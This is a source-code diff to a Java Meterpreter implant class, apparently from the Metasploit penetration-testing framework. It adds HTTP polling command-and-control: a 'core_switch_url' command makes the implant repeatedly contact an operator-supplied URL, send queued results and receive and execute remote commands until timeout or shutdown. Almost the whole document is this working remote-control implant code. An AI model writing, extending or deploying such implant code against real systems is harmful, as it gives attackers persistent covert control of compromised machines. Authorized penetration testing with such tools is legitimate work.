@@ -10,6 +10,7 @@ import java.io.OutputStream;
 import java.io.PrintStream;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -36,6 +37,7 @@ public class Meterpreter {
 	private final ByteArrayOutputStream errBuffer;
 	private final PrintStream err;
 	private final boolean loadExtensions;
+	private List/* <byte[]> */tlvQueue = null;
 
 	/**
 	 * Initialize the meterpreter.
@@ -69,7 +71,9 @@ public class Meterpreter {
 				if (ptype != PACKET_TYPE_REQUEST)
 					throw new IOException("Invalid packet type: " + ptype);
 				TLVPacket request = new TLVPacket(in, len - 8);
-				writeTLV(PACKET_TYPE_RESPONSE, executeCommand(request));
+				TLVPacket response = executeCommand(request);
+				if (response != null)
+					writeTLV(PACKET_TYPE_RESPONSE, response);
 			}
 		} catch (EOFException ex) {
 		}
@@ -91,8 +95,17 @@ public class Meterpreter {
 	 * @param packet
 	 *            The packet to send
 	 */
-	private void writeTLV(int type, TLVPacket packet) throws IOException {
+	private synchronized void writeTLV(int type, TLVPacket packet) throws IOException {
 		byte[] data = packet.toByteArray();
+		if (tlvQueue != null) {
+			ByteArrayOutputStream baos = new ByteArrayOutputStream();
+			DataOutputStream dos = new DataOutputStream(baos);
+			dos.writeInt(data.length + 8);
+			dos.writeInt(type);
+			dos.write(data);
+			tlvQueue.add(baos.toByteArray());
+			return;
+		}
 		synchronized (out) {
 			out.writeInt(data.length + 8);
 			out.writeInt(type);
@@ -111,6 +124,15 @@ public class Meterpreter {
 	private TLVPacket executeCommand(TLVPacket request) throws IOException {
 		TLVPacket response = new TLVPacket();
 		String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
+		if (method.equals("core_switch_url")) {
+			String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
+			int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
+			int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
+			pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
+			return null;
+		} else if (method.equals("core_shutdown")) {
+			return null;
+		}
 		response.add(TLVType.TLV_TYPE_METHOD, method);
 		response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
 		Command cmd = commandManager.getCommand(method);
@@ -123,6 +145,72 @@ public class Meterpreter {
 		}
 		response.add(TLVType.TLV_TYPE_RESULT, result);
 		return response;
+	}
+	
+	/**
+	 * Poll from a given URL until a shutdown request is received.
+	 * @param url
+	 */
+	private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws IOException {
+		synchronized (this) {
+			tlvQueue = new ArrayList();
+		}
+		long deadline = System.currentTimeMillis() + sessionExpirationTimeout * 1000L;
+		long commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
+		final byte[] RECV = "RECV".getBytes("ISO-8859-1");
+		while (System.currentTimeMillis() < Math.min(commDeadline, deadline)) {
+			byte[] outPacket = null;
+			synchronized (this) {
+				if (tlvQueue.size() > 0)
+					outPacket = (byte[]) tlvQueue.remove(0);
+			}
+			TLVPacket request = null;
+			try {
+				URLConnection uc = url.openConnection();
+				uc.setDoOutput(true);
+				OutputStream out = uc.getOutputStream();
+				out.write(outPacket == null ? RECV : outPacket);
+				out.close();
+				DataInputStream in = new DataInputStream(uc.getInputStream());
+				int len;
+				try {
+					len = in.readInt();
+				} catch (EOFException ex) {
+					len = -1;
+				}
+				if (len != -1) {
+					int ptype = in.readInt();
+					if (ptype != PACKET_TYPE_REQUEST)
+						throw new RuntimeException("Invalid packet type: " + ptype);
+					request = new TLVPacket(in, len - 8);
+				}
+				in.close();
+				commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
+			} catch (IOException ex) {
+				ex.printStackTrace(getErrorStream());
+				// URL not reachable
+				if (outPacket != null) {
+					synchronized (this) {
+						tlvQueue.add(0, outPacket);
+					}
+				}
+			}
+			if (request != null) {
+				TLVPacket response = executeCommand(request);
+				if (response == null)
+					break;
+				writeTLV(PACKET_TYPE_RESPONSE, response);
+			} else if (outPacket == null) {
+				try {
+					Thread.sleep(5000);
+				} catch (InterruptedException ex) {
+					// ignore
+				}
+			}
+		}
+		synchronized (this) {
+			tlvQueue = new ArrayList();
+		}
 	}
 
 	/**
